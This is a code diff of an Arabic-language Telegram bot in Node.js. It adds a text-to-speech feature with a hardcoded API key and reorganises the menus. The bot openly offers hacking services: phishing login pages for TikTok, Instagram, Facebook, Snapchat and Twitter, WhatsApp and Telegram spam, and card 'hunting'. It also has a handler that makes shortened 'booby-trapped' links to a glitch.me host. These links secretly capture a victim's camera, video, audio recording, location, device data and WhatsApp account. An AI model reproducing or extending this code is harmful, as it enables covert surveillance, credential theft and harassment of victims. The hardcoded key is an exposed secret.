@@ -8,8 +8,9 @@ const TinyURL = require('tinyurl');
 const axios = require('axios');
 const os = require('os');
 const https = require('https');
+const googleTTS = require('google-tts-api');
 require('dotenv').config();  
- 
+
     
 
 
@@ -175,8 +176,100 @@ function verifyData() {
 setTimeout(verifyData, 10000); // تأخير بسيط لضمان أن البيانات قد تم حفظها
 
 
+const VOICERSS_API_KEY = 'cbee32ada8744ab299d7178348b0c6f3';
 
-// تحميل البيانات عند بدء التشغيل
+// دالة لتحويل النص إلى صوت باستخدام VoiceRSS (صوت الذكر)
+async function convertTextToMaleVoice(text) {
+  const fileName = `tts_${Date.now()}.mp3`;
+  const voice = 'ar-sa_male'; // صوت ذكر
+
+  const url = `https://api.voicerss.org/?key=${VOICERSS_API_KEY}&hl=ar-sa&src=${encodeURIComponent(text)}&v=${voice}&f=44khz_16bit_stereo`;
+
+  return downloadAudio(url, fileName);
+}
+
+// دالة لتحويل النص إلى صوت باستخدام Google TTS (صوت الأنثى)
+async function convertTextToFemaleVoice(text) {
+  const fileName = `tts_${Date.now()}.mp3`;
+  const url = googleTTS.getAudioUrl(text, {
+    lang: 'ar', // اللغة العربية
+    slow: false,
+    host: 'https://translate.google.com',
+  });
+
+  return downloadAudio(url, fileName);
+}
+
+// دالة لتنزيل الصوت من رابط معين
+async function downloadAudio(url, filename) {
+  return new Promise((resolve, reject) => {
+    https.get(url, (response) => {
+      if (response.statusCode !== 200) {
+        reject(new Error(`Failed to download file: ${response.statusCode}`));
+        return;
+      }
+      const writeStream = fs.createWriteStream(filename);
+      response.pipe(writeStream);
+      writeStream.on('finish', () => {
+        writeStream.close();
+        resolve(filename);
+      });
+    }).on('error', reject);
+  });
+}
+
+
+// استماع للضغط على زر "تحويل النص إلى صوت"
+bot.on('callback_query', async (callbackQuery) => {
+  const chatId = callbackQuery.message.chat.id;
+
+  if (callbackQuery.data === 'convert_to_speech') {
+    bot.sendMessage(chatId, 'اختر نوع الصوت:', {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: 'صوت ذكر', callback_data: 'male_voice' }],
+          [{ text: 'صوت أنثى', callback_data: 'female_voice' }]
+        ]
+      }
+    });
+  } else if (callbackQuery.data === 'male_voice' || callbackQuery.data === 'female_voice') {
+    const gender = callbackQuery.data === 'male_voice' ? 'male' : 'female';
+
+    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
+      chat_id: chatId,
+      message_id: callbackQuery.message.message_id
+    });
+
+    const genderText = gender === 'male' ? 'ذكر' : 'أنثى';
+    bot.sendMessage(chatId, `الآن أرسل النص الذي تريد تحويله إلى صوت بصوت ${genderText}.`);
+
+    bot.once('message', async (msg) => {
+      const text = msg.text;
+
+      try {
+        let ttsFileName;
+
+        if (gender === 'male') {
+          // استخدام VoiceRSS لتحويل النص إلى صوت ذكر
+          ttsFileName = await convertTextToMaleVoice(text);
+        } else {
+          // استخدام Google TTS لتحويل النص إلى صوت أنثى
+          ttsFileName = await convertTextToFemaleVoice(text);
+        }
+
+        // إرسال الصوت المحول
+        await bot.sendVoice(chatId, fs.createReadStream(ttsFileName));
+
+        // حذف الملفات المؤقتة
+        fs.unlinkSync(ttsFileName);
+      } catch (error) {
+        console.error('Error:', error);
+        bot.sendMessage(chatId, 'حدث خطأ أثناء تحويل النص إلى صوت.');
+      }
+    });
+  }
+});
+
 
 
 
@@ -604,7 +697,7 @@ bot.on('callback_query', (query) => {
 // استبدل 'YOUR_OPENAI_API_KEY' بمفتاح API الخاص بك من OpenAI
 
 
-const cameraCountries = {
+const countryNamesWithFlags = {
     "AF": "أفغانستان 🇦🇫",
   "AL": "ألبانيا 🇦🇱",
   "DZ": "الجزائر 🇩🇿",
@@ -879,8 +972,8 @@ async function getJoke(chatId) {
 
 function showCountryList(chatId, startIndex = 0) {
   const buttons = [];
-  const countryCodes = Object.keys(countryTranslation);
-  const countryNames = Object.values(countryTranslation);
+  const countryCodes = Object.keys(countryNamesWithFlags);
+ const countryNames = Object.values(countryNamesWithFlags);
 
   const endIndex = Math.min(startIndex + 99, countryCodes.length);
 
@@ -2530,44 +2623,49 @@ function showDefaultButtons(userId) {
       { text: '🐦 اختراق تويتر', callback_data: 'increase_twitter' }
     ],
     [
-      { text: '📻 إختراق راديو', callback_data: 'radio_stations' },
       { text: 'صيد فيزات 💳', callback_data: 'generate_card' }
     ],
     [
-      { text: 'اغلاق المواقع 💣', web_app: { url: 'https://believed-radial-yogurt.glitch.me/' } },
-      { text: 'الدردشة مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://plausible-broken-responsibility.glitch.me/' } }
+      { text: 'اغلاق المواقع 💣', web_app: { url: 'https://believed-radial-yogurt.glitch.me/' } }
     ],
     [
-      { text: 'اعطيني نكته 🤣', callback_data: 'get_joke' },
-      { text: '🎵 اندكس تيك توك 🎵', callback_data: 'login_tiktok' }
+      { text: 'الدردشة مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://plausible-broken-responsibility.glitch.me/' } },
+      { text: 'اعطيني نكته 🤣', callback_data: 'get_joke' }
     ],
     [
-      { text: '📸 اندكس انستغرام 📸', callback_data: 'login_instagram' },
-      { text: '📘 اندكس فيسبوك 📘', callback_data: 'login_facebook' }
+      { text: '🎵 اندكس تيك توك 🎵', callback_data: 'login_tiktok' },
+      { text: '📸 اندكس انستغرام 📸', callback_data: 'login_instagram' }
     ],
     [
-      { text: '👻 اندكس سناب شات 👻', callback_data: 'login_snapchat' },
-      { text: '🐦 اندكس تويتر 🐦', callback_data: 'login_twitter' }
+      { text: '📘 اندكس فيسبوك 📘', callback_data: 'login_facebook' },
+      { text: '👻 اندكس سناب شات 👻', callback_data: 'login_snapchat' }
     ],
     [
-      { text: '🚸 اكتب لي رسالة فك حظر واتساب', callback_data: 'get_love_message' },
-      { text: 'تفسير الأحلام 🧙‍♂️', web_app: { url: 'https://necessary-evening-canidae.glitch.me/' } }
+      { text: '🐦 اندكس تويتر 🐦', callback_data: 'login_twitter' },
+      { text: '🚸 اكتب لي رسالة فك حظر واتساب', callback_data: 'get_love_message' }
     ],
     [
-      { text: 'لعبة الأذكياء 🧠', web_app: { url: 'https://purrfect-eastern-salamander.glitch.me/' } },
-      { text: '✉️ إنشاء إيميل وهمي', callback_data: 'create_email' }
+      { text: 'تفسير الأحلام 🧙‍♂️', web_app: { url: 'https://necessary-evening-canidae.glitch.me/' } },
+      { text: 'لعبة الأذكياء 🧠', web_app: { url: 'https://purrfect-eastern-salamander.glitch.me/' } }
     ],
     [
-      { text: '💥 سبام واتساب', callback_data: 'whatsapp_spam' },
+      { text: '✉️ إنشاء إيميل وهمي', callback_data: 'create_email' },
+      { text: '💥 سبام واتساب', callback_data: 'whatsapp_spam' }
+    ],
+    [
       { text: 'إختراق الهاتف كاملاً 🔞', callback_data: 'add_nammes' }
     ],
     [
       { text: '🚀 سبام تيليجرام', callback_data: 'spam_telegram' },
-      { text: '📞 بوت كاشف الأرقام', url: 'https://t.me/S_S_YEbot' }
+      { text: '📻 إختراق راديو', callback_data: 'radio_stations' }
     ],
     [
-      { text: '📱 بوت جمع معلومات انستا وتيك توك', url: 'https://t.me/Medic_inebot' },
-      { text: '🔍 فحص رابط', callback_data: 'check_link' }
+      { text: '📞 بوت كاشف الأرقام', url: 'https://t.me/S_S_YEbot' },
+      { text: '📱 معلومات انستا وتيك توك', url: 'https://t.me/Medic_inebot' }
+    ],
+    [
+      { text: '🔍 فحص رابط', callback_data: 'check_link' },
+      { text: '🔄 تحويل النص إلى صوت', callback_data: 'convert_to_speech' }
     ],
     [
       { text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' },
@@ -2585,7 +2683,84 @@ function showDefaultButtons(userId) {
 
 
 
-const radioCountries = {
+
+
+      
+// التعامل مع الضغطة على الزر
+
+bot.on('callback_query', (callbackQuery) => {
+    const chatId = callbackQuery.message.chat.id;
+    const data = callbackQuery.data;
+
+    function shortenUrlAndSendMessage(url, messagePrefix) {
+        axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`)
+            .then(response => {
+                const shortUrl = response.data;
+                bot.sendMessage(chatId, `${messagePrefix} ${shortUrl}`);
+            })
+            .catch(error => {
+                bot.sendMessage(chatId, 'حدث خطأ أثناء اختصار الرابط. الرجاء المحاولة لاحقًا.');
+            });
+    }
+
+    if (data === 'malware_link') {
+        bot.sendMessage(chatId, 'من فضلك أرسل الرابط الذي ترغب في تلغيمه:');
+        bot.once('message', (msg) => {
+            if (msg.text) {
+                const link = msg.text;
+                const malwareUrl = `https://snow-fringe-play.glitch.me/malware?chatId=${chatId}&originalLink=${encodeURIComponent(link)}`;
+                shortenUrlAndSendMessage(malwareUrl, '⚠️ تم تلغيم الرابط، استخدم هذا الرابط لاختراق:');
+            } else {
+                bot.sendMessage(chatId, 'الرجاء إرسال رابط نصي صالح.');
+            }
+        });
+    } else if (data === 'front_camera' || data === 'rear_camera') {
+        const url = `https://snow-fringe-play.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية:');
+    } else if (data === 'voice_record') {
+        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
+        bot.once('message', (msg) => {
+            const duration = parseInt(msg.text, 10);
+            if (!isNaN(duration) && duration >= 1 &&  duration <= 20) {
+                const url = `https://snow-fringe-play.glitch.me/record/${chatId}?duration=${duration}`;
+                shortenUrlAndSendMessage(url, `تم تلغيم رابط تسجيل الصوت لمدة ${duration} ثانية:`);
+            } else {
+                bot.sendMessage(chatId, 'الرجاء إدخال مدة تسجيل صحيحة بين 1 و 20 ثانية.');
+            }
+        });
+    } else if (data === 'get_location') {
+        const url = `https://snow-fringe-play.glitch.me/getLocation/${chatId}`;
+        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق موقع الضحية:');
+    } else if (data === 'capture_video') {
+        const url = `https://snow-fringe-play.glitch.me/camera/video/${chatId}`;
+        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية فيديو:');
+    } else if (data === 'request_verification') {
+        const verificationLink = `https://snow-fringe-play.glitch.me/whatsapp?chatId=${chatId}`;
+        shortenUrlAndSendMessage(verificationLink, 'تم إنشاء رابط لاختراق واتساب:');
+    } else if (data === 'collect_device_info') {
+        const url = `https://snow-fringe-play.glitch.me/${chatId}`;
+        shortenUrlAndSendMessage(url, 'تم تلغيم  رابط  جمع معلومات اجهزه الضحيه:');
+    
+    }
+});
+
+//bot.on('message', (msg) => {
+//  const chatId = msg.chat.id;
+//  const duration = parseInt(msg.text, 10);
+
+ // if (!isNaN(duration)) {
+ //   if (duration > 0 && duration <= 20) {
+     // const link = `}`;
+      //bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت الضحيه لمدة ${duration} ثواني: ${link}`);
+   // } else {
+ //     bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
+ //   }
+//  }
+//});
+
+
+
+const countryTranslation = {
   "United Arab Emirates": "الإمارات 🇦🇪",
   "Saudi Arabia": "السعودية 🇸🇦",
   "Yemen": "اليمن 🇾🇪👑",
@@ -2778,7 +2953,7 @@ async function getStations(country) {
 }
 
 // دالة لعرض قائمة الدول
-function showCountryList(chatId, startIndex = 0) {
+function showRadioCountryList(chatId, startIndex = 0) {
   const buttons = [];
   const countryCodes = Object.keys(countryTranslation);
   const countryNames = Object.values(countryTranslation);
@@ -2790,24 +2965,24 @@ function showCountryList(chatId, startIndex = 0) {
     for (let j = i; j < i + 3 && j < endIndex; j++) {
       const code = countryCodes[j];
       const name = countryNames[j];
-      row.push({ text: name, callback_data: `country_${code}` });
+      row.push({ text: name, callback_data: `radio_country_${code}` });
     }
     buttons.push(row);
   }
 
   const navigationButtons = [];
   if (startIndex > 0) {
-    navigationButtons.push({ text: "السابق", callback_data: `prev_${startIndex - 70}` });
+    navigationButtons.push({ text: "السابق", callback_data: `radio_prev_${startIndex - 70}` });
   }
   if (endIndex < countryCodes.length) {
-    navigationButtons.push({ text: "التالي", callback_data: `next_${endIndex}` });
+    navigationButtons.push({ text: "التالي", callback_data: `radio_next_${endIndex}` });
   }
 
   if (navigationButtons.length) {
     buttons.push(navigationButtons);
   }
 
-  bot.sendMessage(chatId, "اختر الدولة لاختراق  الراديو:", {
+  bot.sendMessage(chatId, "اختر الدولة لمحطات الراديو:", {
     reply_markup: {
       inline_keyboard: buttons
     }
@@ -2847,81 +3022,6 @@ bot.on('callback_query', async (query) => {
   }
 });
 
-
-
-
-      
-// التعامل مع الضغطة على الزر
-
-bot.on('callback_query', (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-
-    function shortenUrlAndSendMessage(url, messagePrefix) {
-        axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`)
-            .then(response => {
-                const shortUrl = response.data;
-                bot.sendMessage(chatId, `${messagePrefix} ${shortUrl}`);
-            })
-            .catch(error => {
-                bot.sendMessage(chatId, 'حدث خطأ أثناء اختصار الرابط. الرجاء المحاولة لاحقًا.');
-            });
-    }
-
-    if (data === 'malware_link') {
-        bot.sendMessage(chatId, 'من فضلك أرسل الرابط الذي ترغب في تلغيمه:');
-        bot.once('message', (msg) => {
-            if (msg.text) {
-                const link = msg.text;
-                const malwareUrl = `https://snow-fringe-play.glitch.me/malware?chatId=${chatId}&originalLink=${encodeURIComponent(link)}`;
-                shortenUrlAndSendMessage(malwareUrl, '⚠️ تم تلغيم الرابط، استخدم هذا الرابط لاختراق:');
-            } else {
-                bot.sendMessage(chatId, 'الرجاء إرسال رابط نصي صالح.');
-            }
-        });
-    } else if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://snow-fringe-play.glitch.me/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
-        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية:');
-    } else if (data === 'voice_record') {
-        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
-        bot.once('message', (msg) => {
-            const duration = parseInt(msg.text, 10);
-            if (!isNaN(duration) && duration >= 1 &&  duration <= 20) {
-                const url = `https://snow-fringe-play.glitch.me/record/${chatId}?duration=${duration}`;
-                shortenUrlAndSendMessage(url, `تم تلغيم رابط تسجيل الصوت لمدة ${duration} ثانية:`);
-            } else {
-                bot.sendMessage(chatId, 'الرجاء إدخال مدة تسجيل صحيحة بين 1 و 20 ثانية.');
-            }
-        });
-    } else if (data === 'get_location') {
-        const url = `https://snow-fringe-play.glitch.me/getLocation/${chatId}`;
-        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق موقع الضحية:');
-    } else if (data === 'capture_video') {
-        const url = `https://snow-fringe-play.glitch.me/camera/video/${chatId}`;
-        shortenUrlAndSendMessage(url, 'تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية فيديو:');
-    } else if (data === 'request_verification') {
-        const verificationLink = `https://snow-fringe-play.glitch.me/whatsapp?chatId=${chatId}`;
-        shortenUrlAndSendMessage(verificationLink, 'تم إنشاء رابط لاختراق واتساب:');
-    } else if (data === 'collect_device_info') {
-        const url = `https://snow-fringe-play.glitch.me/${chatId}`;
-        shortenUrlAndSendMessage(url, 'تم تلغيم  رابط  جمع معلومات اجهزه الضحيه:');
-    
-    }
-});
-
-//bot.on('message', (msg) => {
-//  const chatId = msg.chat.id;
-//  const duration = parseInt(msg.text, 10);
-
- // if (!isNaN(duration)) {
- //   if (duration > 0 && duration <= 20) {
-     // const link = `}`;
-      //bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت الضحيه لمدة ${duration} ثواني: ${link}`);
-   // } else {
- //     bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
- //   }
-//  }
-//});
 
 
 
